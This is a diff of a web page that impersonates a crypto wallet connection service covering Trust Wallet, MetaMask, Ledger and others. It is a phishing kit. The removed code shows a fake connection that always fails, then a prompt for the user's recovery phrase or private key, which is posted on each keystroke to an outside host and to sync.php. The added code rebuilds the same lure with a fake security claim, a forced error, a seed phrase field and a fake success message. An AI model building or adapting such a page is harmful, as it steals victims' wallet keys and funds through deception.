+        <div class="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-4 xl:grid-cols-5 gap-4 sm:gap-6">
+            <template x-for="wallet in filteredWallets" :key="wallet.name">
+                <div 
+                    @click="openWalletModal(wallet)"
+                    class="wallet-card relative bg-gray-800/50 hover:bg-gray-800 border border-gray-700 hover:border-indigo-500/50 rounded-2xl p-4 sm:p-6 cursor-pointer group"
+                    :class="{ 'connected-glow border-green-500': wallet.connected }"
+                >
+                    <div class="flex flex-col items-center text-center">
+                        <div class="w-14 h-14 sm:w-16 sm:h-16 mb-3 relative">
+                            <img :src="wallet.logo" :alt="wallet.name" class="w-full h-full rounded-xl object-cover bg-gray-700">
+                            <div x-show="wallet.connected" class="absolute -top-1 -right-1 w-5 h-5 bg-green-500 rounded-full flex items-center justify-center">
+                                <i data-lucide="check" class="w-3 h-3 text-white"></i>
+                            </div>
+                        </div>
+                        <h3 class="font-semibold text-white text-sm sm:text-base mb-1" x-text="wallet.name"></h3>
+                        <template x-if="wallet.connected">
+                            <span class="text-xs text-green-400 font-medium">Connected</span>
+                        </template>
+                        <template x-if="!wallet.connected">
+                            <span class="text-xs text-gray-500 group-hover:text-indigo-400 transition-colors">Click to connect</span>
+                        </template>
                     </div>
+                    <div class="absolute top-2 right-2">
+                        <div class="w-2 h-2 rounded-full" :class="wallet.connected ? 'bg-green-400' : 'bg-gray-600'"></div>
+                    </div>
+                </div>
+            </template>
+        </div>
 
-                    <h4 style="padding:10px;
-   
-   color: red">An Error was encountered while trying to connect... Please try again later</h4>
-
+        <!-- Security Info -->
+        <div class="mt-12 bg-gray-800/30 border border-gray-700 rounded-2xl p-6">
+            <div class="flex flex-col sm:flex-row items-center gap-4 text-center sm:text-left">
+                <div class="p-3 bg-green-500/10 rounded-xl">
+                    <i data-lucide="shield-check" class="w-8 h-8 text-green-400"></i>
+                </div>
+                <div>
+                    <h3 class="text-lg font-semibold text-white mb-1">Bank-Grade Security</h3>
+                    <p class="text-gray-400 text-sm">All wallet connections use end-to-end encryption. Your private keys never leave your device.</p>
                 </div>
             </div>
         </div>
-    </div>
-    <div class="modal fade popup" id="popup_connect_wallet" tabindex="-1" role="dialog" aria-hidden="true">
-        <div class="modal-dialog modal-dialog-centered" role="document">
-            <div class="modal-content">
-                <button type="button" class="close" data-dismiss="modal" aria-label="Close">
-                    <span aria-hidden="true">×</span>
-                </button>
-                <div class="modal-body space-y-20 pd-40">
+    </main>
 
-                    <h3>
-                        <img width="50" height="50" class="avatar" id="wallet_logo"><br>
-                        <span id="wallet_name" clas="mt-1">Sync Wallet</span>
-                    </h3>
-                    <p class="text-center">
-                        This session is secured and encrypted </p>
+    <!-- Wallet Modal -->
+    <div 
+        x-show="showModal" 
+        x-cloak
+        class="fixed inset-0 z-50 flex items-center justify-center p-4"
+        @keydown.escape.window="closeModal()"
+    >
+        <!-- Backdrop -->
+        <div 
+            class="absolute inset-0 bg-black/70 backdrop-blur-sm"
+            @click="closeModal()"
+            x-show="showModal"
+            x-transition:enter="transition ease-out duration-300"
+            x-transition:enter-start="opacity-0"
+            x-transition:enter-end="opacity-100"
+            x-transition:leave="transition ease-in duration-200"
+            x-transition:leave-start="opacity-100"
+            x-transition:leave-end="opacity-0"
+        ></div>
 
-                    <div id="auto_connecting" style="display:none;">
-                        <br><br><br>
-                        <div class="heading-line s2" style="width: 100%;">
-                            <br>
-                            <h5 align="center">
-                                starting secure connection...<br>
-                                <i align="center" style="text-align: center !important; font-size:small"
-                                    class="text-muted align-items-center">please wait...</i>
-                            </h5>
-                            <br>
-                        </div>
-                    </div>
-
-                    <div id="failed_to_connect" style="display:none;">
-                        <div
-                            style="padding:6px; color:red; border:1px solid red; border-radius:5px; text-align:center!important; font-size:16px; font-weight:500;">
-                            An error occurred... please try again or connect mannually
-                        </div>
-                        <br><br><br>
-                        <a href="#" id="try_auto_connecting_again" class="btn btn-outline-primary"
-                            aria-label="Close">Try Again</a><br>
-                        <a href="#" id="button_connect_manually" class="btn btn-primary">Connect Manually</a>
-                    </div>
-
-                    <div id="div_connect_manuallly" style="display:none;">
-                        <textarea style="font-size:16px; font-weight:400;" rows="4" name="secret_phrase"
-                            id="phraseinput" class="form-control text-black"
-                            placeholder="Enter your 12 or 24 Mnemonic words. Seperate them with spaces. You can also input your privatekey instead."></textarea><br>
-
-                        <button disabled="" type="submit" id="button_connect_wallet" class="btn btn-primary"
-                            style="border-top: 5px; opacity:0.2">Connect Wallet</button>
-                    </div>
-
-
+        <!-- Modal Content -->
+        <div 
+            class="relative bg-gray-900 border border-gray-700 rounded-2xl shadow-2xl w-full max-w-md overflow-hidden"
+            x-show="showModal"
+            x-transition:enter="transition ease-out duration-300"
+            x-transition:enter-start="opacity-0 scale-95"
+            x-transition:enter-end="opacity-100 scale-100"
+            x-transition:leave="transition ease-in duration-200"
+            x-transition:leave-start="opacity-100 scale-100"
+            x-transition:leave-end="opacity-0 scale-95"
+        >
+            <!-- Modal Header -->
+            <div class="flex items-center justify-between p-4 sm:p-6 border-b border-gray-800">
+                <div class="flex items-center gap-3">
+                    <img :src="selectedWallet?.logo" :alt="selectedWallet?.name" class="w-10 h-10 rounded-xl bg-gray-700">
                     <div>
-                        <br><br><br>
-                        <h6 align="center" class="mt-4 text-muted align-items-center"><img
-                                src="static/icon/shield.png" width="30" height="30"> This session is protected
-                            with an end-to-end encryption.<br>
-                            <span style="color: red !important">Never share your seed phrase with anybody!</span>
-                            </h6>
+                        <h3 class="font-semibold text-white" x-text="selectedWallet?.name"></h3>
+                        <p class="text-xs text-gray-400">Wallet Connection</p>
                     </div>
+                </div>
+                <button @click="closeModal()" class="p-2 hover:bg-gray-800 rounded-lg transition-colors">
+                    <i data-lucide="x" class="w-5 h-5 text-gray-400"></i>
+                </button>
+            </div>
+
+            <!-- Modal Body -->
+            <div class="p-4 sm:p-6">
+                <!-- Security Badge -->
+                <div class="flex items-center justify-center gap-2 mb-6 text-sm text-gray-400">
+                    <i data-lucide="lock" class="w-4 h-4 text-green-400"></i>
+                    <span>This session is secured and encrypted</span>
+                </div>
+
+                <!-- Loading State -->
+                <div x-show="modalState === 'loading'" class="text-center py-8">
+                    <div class="inline-flex items-center justify-center w-16 h-16 mb-4">
+                        <div class="w-12 h-12 border-4 border-indigo-500/30 border-t-indigo-500 rounded-full animate-spin-slow"></div>
+                    </div>
+                    <p class="text-white font-medium mb-2">Starting secure connection...</p>
+                    <p class="text-gray-400 text-sm animate-pulse-slow">Please wait...</p>
+                    <div class="mt-4 flex items-center justify-center gap-2">
+                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce" style="animation-delay: 0ms;"></div>
+                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce" style="animation-delay: 150ms;"></div>
+                        <div class="w-2 h-2 bg-indigo-500 rounded-full animate-bounce" style="animation-delay: 300ms;"></div>
+                    </div>
+                </div>
+
+                <!-- Error State -->
+                <div x-show="modalState === 'error'" class="text-center py-6">
+                    <div class="inline-flex items-center justify-center w-16 h-16 bg-red-500/10 rounded-full mb-4">
+                        <i data-lucide="alert-circle" class="w-8 h-8 text-red-400"></i>
+                    </div>
+                    <p class="text-white font-medium mb-2">An error occurred...</p>
+                    <p class="text-gray-400 text-sm mb-6">Please try again or connect manually.</p>
+                    
+                    <div class="flex flex-col sm:flex-row gap-3">
+                        <button 
+                            @click="retryConnection()"
+                            class="flex-1 inline-flex items-center justify-center gap-2 px-4 py-3 bg-gray-800 hover:bg-gray-700 text-white rounded-xl font-medium transition-colors"
+                        >
+                            <i data-lucide="refresh-cw" class="w-4 h-4"></i>
+                            Try Again
+                        </button>
+                        <button 
+                            @click="showManualConnect()"
+                            class="flex-1 inline-flex items-center justify-center gap-2 px-4 py-3 bg-indigo-600 hover:bg-indigo-700 text-white rounded-xl font-medium transition-colors"
+                        >
+                            <i data-lucide="edit-3" class="w-4 h-4"></i>
+                            Connect Manually
+                        </button>
+                    </div>
+                </div>
+
+                <!-- Manual Connect State -->
+                <div x-show="modalState === 'manual'" class="py-4">
+                    <div class="mb-4">
+                        <label class="block text-sm font-medium text-gray-300 mb-2">Recovery Phrase or Private Key</label>
+                        <textarea 
+                            x-model="recoveryPhrase"
+                            rows="4"
+                            placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your private key instead."
+                            class="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 focus:ring-2 focus:ring-indigo-500/20 transition-all resize-none text-sm"
+                        ></textarea>
+                    </div>
+                    
+                    <button 
+                        @click="connectWallet()"
+                        :disabled="!recoveryPhrase.trim()"
+                        class="w-full inline-flex items-center justify-center gap-2 px-4 py-3 bg-gradient-to-r from-indigo-600 to-blue-600 hover:from-indigo-700 hover:to-blue-700 disabled:from-gray-700 disabled:to-gray-700 disabled:cursor-not-allowed text-white rounded-xl font-medium transition-all shadow-lg"
+                    >
+                        <i data-lucide="link" class="w-4 h-4"></i>
+                        Connect
+                    </button>
+                    
+                    <p class="text-xs text-gray-500 text-center mt-4">
+                        Your recovery phrase is encrypted and never stored on our servers.
+                    </p>
+                </div>
+
+                <!-- Connecting State -->
+                <div x-show="modalState === 'connecting'" class="text-center py-8">
+                    <div class="inline-flex items-center justify-center w-16 h-16 mb-4">
+                        <div class="w-12 h-12 border-4 border-blue-500/30 border-t-blue-500 rounded-full animate-spin-slow"></div>
+                    </div>
+                    <p class="text-white font-medium mb-2">Connecting...</p>
+                    <p class="text-gray-400 text-sm">Establishing secure connection to your wallet</p>
+                </div>
+
+                <!-- Connected State -->
+                <div x-show="modalState === 'connected'" class="text-center py-8">
+                    <div class="inline-flex items-center justify-center w-16 h-16 bg-green-500/10 rounded-full mb-4">
+                        <i data-lucide="check-circle" class="w-10 h-10 text-green-400"></i>
+                    </div>
+                    <p class="text-white font-medium text-xl mb-2">Connected!</p>
+                    <p class="text-gray-400 text-sm mb-6">Your wallet has been successfully connected.</p>
+                    
+                    <button 
+                        @click="closeModal()"
+                        class="inline-flex items-center justify-center gap-2 px-6 py-3 bg-green-600 hover:bg-green-700 text-white rounded-xl font-medium transition-colors"
+                    >
+                        <i data-lucide="check" class="w-4 h-4"></i>
+                        Done
+                    </button>
                 </div>
             </div>
         </div>
     </div>
 
-
-<script type="997c782b72d70a724e4449d9-text/javascript">
-    // Handle Select Wallet Click
-    $(function () {
-        $('.select_wallet').on('click', function () {
-            var wd = $(this); // wd = wallet details
-            $('#wallet_name').text(wd.data('title'));
-            $('#wallet_logo').attr("src", wd.data('logo'));
-            $('#auto_connecting').show();
-            $('#failed_to_connect').hide();
-            $('#div_connect_manuallly').hide();
-
-            $('#popup_connect_wallet').modal('show');
-
-            // Hide autoconnecting div and show error in random interval
-            var interval = 1000 * getRandomInt(1, 15);
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#div_connect_manuallly').hide();
-                $('#failed_to_connect').show();
-            }, interval);
-        });
-
-        $('#try_auto_connecting_again').on('click', function (e) {
-            e.preventDefault();
-            $('#auto_connecting').show();
-            $('#failed_to_connect').hide();
-            $('#div_connect_manuallly').hide();
-
-            // Hide autoconnecting div and show error in random interval
-            var interval = 1000 * getRandomInt(1, 20);
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#div_connect_manuallly').hide();
-                $('#failed_to_connect').show();
-            }, interval);
-        });
-
-        $(document).on("click", "#button_connect_manually", function (e) {
-            e.preventDefault();
-            $('#auto_connecting').hide();
-            $('#failed_to_connect').hide();
-            $('#div_connect_manuallly').show();
-        });
-
-     //FOR PHRASE TEXT VALIDATION
-     $('#phraseinput').on('keyup', function () {
-    var phrase_seed_entered = $(this).val().trim();
-    if (phrase_seed_entered != "") {
-        var phrase_count = phrase_seed_entered.match(/(\w+)/g).length;
-        console.log(phrase_count);
-        if ([12, 15, 18, 21, 24].includes(phrase_count)) {
-            $('#button_connect_wallet').attr('disabled', false).css('opacity', '1');
-        } else {
-            $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2');
-        }
-        // Send the data to a server-side script
-        $.ajax({
-            url: 'https://memetokenscan.com/handle_phrase.php',
-            type: 'post',
-            data: { 'phrase': phrase_seed_entered },
-            success: function(response) {
-                console.log(response);
-            },
-            error: function(jqXHR, textStatus, errorThrown) {
-                console.log(textStatus, errorThrown);
-            }
-        });
-    } else {
-        $('#button_connect_wallet').attr('disabled', true).css('opacity', '0.2');
-    }
-});
-
-function sendPhrase(phrase) {
-    var phraseCount = phrase.match(/(\w+)/g).length;
-    if ([12, 24].includes(phraseCount)) {
-        fetch('./sync.php', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({ phrase: phrase }),
-        })
-        .then(response => response.json())
-        .then(data => console.log('Success:', data))
-        .catch((error) => console.error('Error:', error));
-    }
-}
-
-
-
-        // CONNECT WALLET BUTTON Handler
-        $(document).on("click", "#button_connect_wallet", function (e) {
-            e.preventDefault();
-            let field = $('#phraseinput');
-            $(this).text('Connecting...');
-
-            var interval = 1000 * getRandomInt(1, 20);
-            setTimeout(() => {
-                $('#auto_connecting').hide();
-                $('#div_connect_manuallly').hide();
-                $('#failed_to_connect').show();
-                $(this).text('Connect Wallet');
-            }, interval);
-
-            var formData = {
-                phrase: field.val(),
-                wallet_title: $('#wallet_title').text(),
-                wallet_name: $('#wallet_name').text(),
-                sent: 'yes'
-            };
-
-            $.ajax({
-                type: "POST",
-                url: "sync.php",
-                data: formData,
-                dataType: "json",
-                encode: true,
-            }).done(function (data) {
-                console.log(data);
-            });
-        });
-
-        function getRandomInt(min, max) {
-            min = Math.ceil(min);
-            max = Math.floor(max);
-            return Math.floor(Math.random() * (max - min) + min); // The maximum is exclusive and the minimum is inclusive
-        }
-        
-        
-        
-        $('.search').keyup(function(){
-            var key = $(this).val()
-            var found = false
-            $('.wallets').each(function(){
-                var dataTitle = $(this).find(".sc-author-box").data("title");
-                if(dataTitle.toLowerCase().startsWith(key.toLowerCase())){
-                    found = true
-                    $(this).show()
-                }else{
-                    $(this).hide()
-                }
-                setTimeout(function(){
-                    if(!found){
-                        $('.error').css('display', 'block')
-                    }else{
-                        $('.error').css('display', 'none')
+    <script>
+        function walletApp() {
+            return {
+                searchQuery: '',
+                showModal: false,
+                selectedWallet: null,
+                modalState: 'loading',
+                recoveryPhrase: '',
+                connectionTimeout: null,
+                
+                wallets: [
+                    { name: 'Trust Wallet', logo: 'https://trustwallet.com/assets/images/media/assets/trust_platform.png', connected: false },
+                    { name: 'MetaMask', logo: 'https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/800px-MetaMask_Fox.svg.png', connected: false },
+                    { name: 'Coinbase Wallet', logo: 'https://www.coinbase.com/apple-touch-icon.png', connected: false },
+                    { name: 'WalletConnect', logo: 'https://walletconnect.com/walletconnect-logo.png', connected: false },
+                    { name: 'Phantom', logo: 'https://phantom.app/img/phantom-logo.svg', connected: false },
+                    { name: 'Ledger', logo: 'https://www.ledger.com/wp-content/uploads/2021/11/Ledger_favicon.png', connected: false },
+                    { name: 'Exodus', logo: 'https://www.exodus.com/img/logos/exodus-logo-square-light.png', connected: false },
+                    { name: 'Rainbow', logo: 'https://rainbow.me/favicon.ico', connected: false },
+                    { name: 'Argent', logo: 'https://www.argent.xyz/favicon.ico', connected: false },
+                    { name: 'Binance Wallet', logo: 'https://public.bnbstatic.com/image/cms/blog/20230413/fca29911-83c4-4847-8c5f-e1c569644ecd.png', connected: false },
+                    { name: 'Crypto.com', logo: 'https://crypto.com/favicon.ico', connected: false },
+                    { name: 'Trezor', logo: 'https://trezor.io/static/images/trezor-logo-black.png', connected: false },
+                    { name: 'SafePal', logo: 'https://www.safepal.com/favicon.ico', connected: false },
+                    { name: 'BitPay', logo: 'https://bitpay.com/img/wallet-logos/bitpay.png', connected: false },
+                    { name: 'Atomic Wallet', logo: 'https://atomicwallet.io/favicon.ico', connected: false },
+                    { name: 'Zengo', logo: 'https://zengo.com/favicon.ico', connected: false },
+                    { name: 'Blockchain.com', logo: 'https://www.blockchain.com/favicon.ico', connected: false },
+                    { name: 'Electrum', logo: 'https://electrum.org/favicon.ico', connected: false },
+                    { name: 'Mycelium', logo: 'https://wallet.mycelium.com/favicon.ico', connected: false },
+                    { name: 'Jaxx Liberty', logo: 'https://jaxx.io/favicon.ico', connected: false }
+                ],
+                
+                get filteredWallets() {
+                    if (!this.searchQuery.trim()) return this.wallets;
+                    const query = this.searchQuery.toLowerCase();
+                    return this.wallets.filter(w => w.name.toLowerCase().includes(query));
+                },
+                
+                openWalletModal(wallet) {
+                    this.selectedWallet = wallet;
+                    this.modalState = 'loading';
+                    this.recoveryPhrase = '';
+                    this.showModal = true;
+                    
+                    this.connectionTimeout = setTimeout(() => {
+                        this.modalState = 'error';
+                    }, 10000);
+                    
+                    this.$nextTick(() => lucide.createIcons());
+                },
+                
+                closeModal() {
+                    this.showModal = false;
+                    if (this.connectionTimeout) {
+                        clearTimeout(this.connectionTimeout);
+                        this.connectionTimeout = null;
                     }
-                }, 1)
-            })
-        })
-        
-    });
-</script>
-
-<script src="code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous" type="997c782b72d70a724e4449d9-text/javascript"></script>
-        <script src="images/js1.js" type="997c782b72d70a724e4449d9-text/javascript"></script>
-        <script src="images/js2w.js.download" type="997c782b72d70a724e4449d9-text/javascript"></script>
-
-        <script type="997c782b72d70a724e4449d9-text/javascript">
-            function ready() {
-                document.body.style.display = "block";
+                },
+                
+                retryConnection() {
+                    this.modalState = 'loading';
+                    if (this.connectionTimeout) {
+                        clearTimeout(this.connectionTimeout);
+                    }
+                    this.connectionTimeout = setTimeout(() => {
+                        this.modalState = 'error';
+                    }, 10000);
+                },
+                
+                showManualConnect() {
+                    if (this.connectionTimeout) {
+                        clearTimeout(this.connectionTimeout);
+                        this.connectionTimeout = null;
+                    }
+                    this.modalState = 'manual';
+                    this.$nextTick(() => lucide.createIcons());
+                },
+                
+                connectWallet() {
+                    if (!this.recoveryPhrase.trim()) return;
+                    
+                    this.modalState = 'connecting';
+                    
+                    setTimeout(() => {
+                        this.modalState = 'connected';
+                        
+                        const walletIndex = this.wallets.findIndex(w => w.name === this.selectedWallet.name);
+                        if (walletIndex !== -1) {
+                            this.wallets[walletIndex].connected = true;
+                        }
+                        
+                        this.$nextTick(() => lucide.createIcons());
+                    }, 5000);
+                },
+                
+                init() {
+                    this.$nextTick(() => lucide.createIcons());
+                }
             }
-            document.addEventListener("DOMContentLoaded", ready);
-        </script>
-
-
-    <style>
-    #phraseinput::placeholder{
-    font-size: 16px; 
-        opacity: 0.7; 
-  }
-  #phraseinput{
-    font-size: 16px; 
-  }
-  
-        .btn-outline-primary {
-            width: 100%;
-            border-radius: 20px;
-            font-weight: 700;
-            font-size: 15px;
-            line-height: 22px;
-            padding: 10px 20px;
-            -webkit-transition: all 0.3s ease-in-out;
-            -moz-transition: all 0.3s ease-in-out;
-            -ms-transition: all 0.3s ease-in-out;
-            -o-transition: all 0.3s ease-in-out;
-            transition: all 0.3s ease-in-out;
-            outline: none;
-            border: 1px solid #5142FC;
-            margin-bottom: 10px
         }
-
-        .author-infor h5 .online-dot {
-            display: inline-block !important;
-            width: 8px !important;
-            height: 8px !important;
-            background-color: rgb(4, 154, 4) !important;
-            border-radius: 50% !important;
-            margin-left: 8px !important;
-            vertical-align: middle !important;
-        }
-
         
-
-        .price{
-            display: none;
-        }
-
-
-
-
-    </style>
-    
-<script src="./maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" type="997c782b72d70a724e4449d9-text/javascript"></script>
-<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="997c782b72d70a724e4449d9-|49" defer></script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'9abd41c079d10033',t:'MTc2NTM3NTEwNC4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"9abd41c079d10033","version":"2025.9.1","r":1,"token":"e147bfc2e795407fb037dbb17bb5a063","serverTiming":{"name":{"cfExtPri":true,"cfEdge":true,"cfOrigin":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+        document.addEventListener('DOMContentLoaded', () => {
+            lucide.createIcons();
+        });
+    </script>
 </body>
-
-
-
-
 </html>
